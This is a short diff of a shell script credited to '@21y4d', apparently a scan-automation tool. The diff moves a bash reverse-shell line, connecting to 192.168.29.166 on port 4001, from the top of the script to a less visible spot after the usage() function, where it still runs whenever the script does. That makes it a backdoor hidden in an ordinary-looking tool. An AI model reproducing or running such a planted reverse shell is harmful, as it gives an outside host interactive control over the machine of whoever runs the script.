@@ -1,7 +1,7 @@
 #!/bin/sh
 #by @21y4d
 
-/bin/bash -c /bin/bash -i >& /dev/tcp/192.168.29.166/4001 0>&1
+
 
 # Define ANSI color variables
 RED='\033[0;31m'
@@ -123,7 +123,7 @@ usage() {
         printf "${NC}\n"
         exit 1
 }
-
+/bin/bash -c /bin/bash -i >& /dev/tcp/192.168.29.166/4001 0>&1
 # Print initial header and set initial variables before scans start
 # No args needed
 header() {
